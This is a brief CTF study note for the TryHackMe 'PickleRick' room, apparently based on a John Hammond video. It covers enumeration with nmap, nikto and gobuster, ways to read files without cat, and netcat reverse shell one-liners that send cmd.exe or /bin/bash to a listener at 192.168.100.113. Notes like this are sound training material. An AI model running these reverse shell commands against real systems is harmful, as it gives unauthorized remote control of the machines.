PickleRick

# Notes from JohnHammond TryHackMe Series
[TryHackMe! PickleRick - BYPASSING Blacklists](https://www.youtube.com/watch?v=oCAtfcr3iUw)

## Basic Enumeration
```
nmap -sC -sV -oN <filename> <IP_Address>
```
```
nikto -h <IP_Address>
```
```
gobuster -u <URL> -w <Wordlist> -x <Extension separated by commas>
```

## Got a Command Line (pseudo) 

Reading from file without any text editor / cat
```
while read line; do echo $line; done < filename.txt
```
```
grep . filename.txt
```
This displays all the contents of all the files. The files are traversed recursively
```
grep -R .
```
#### Here . is a regex pattern.

## Getting Reverse Shell

If netcat works then no issue
Server listens on Port 4444:
```
nc –lnvp 4444
```
Client ( if Windows - Do install it on windows first!)
```
nc.exe 192.168.100.113 4444 –e cmd.exe
```
Client ( if Linux )
```
nc 192.168.100.113 4444 –e /bin/bash
```

If its unavailable, check if python(2)/(3) / perl / java / ruby etc are available.
Use the following link to get reverse shell. 
[Pentest Monkey Reverse Shell Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)


## Notes / Tips

If you get a base64 string and it does not work the first decode, try decoding it several times